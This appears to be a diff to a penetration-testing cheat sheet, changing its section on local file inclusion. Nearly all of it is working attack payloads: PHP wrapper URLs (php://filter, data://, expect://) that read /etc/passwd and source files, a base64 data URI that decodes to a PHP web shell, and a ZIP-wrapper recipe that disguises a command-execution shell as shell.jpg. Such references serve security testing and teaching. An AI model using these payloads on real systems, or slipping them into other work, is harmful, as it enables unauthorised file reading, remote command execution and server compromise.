@@ -164,14 +164,21 @@ Connection: close
 
 
 #### Local File Inclusion: Reading Files
-```
+```bash
 file:///etc/passwd
-../../../etc/passwd
-php://filter/convert.base64-encode/resource=admin.php
-php://filter/convert.base64-encode/resource=../../../../../etc/passwd
 php://input
     send post data
 expect://whoami
+http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+
+# ZIP Wrapper
+echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
+zip payload.zip payload.php;   
+mv payload.zip shell.jpg;    
+http://example.com/index.php?page=zip://shell.jpg%23payload.php
 ```
 
 
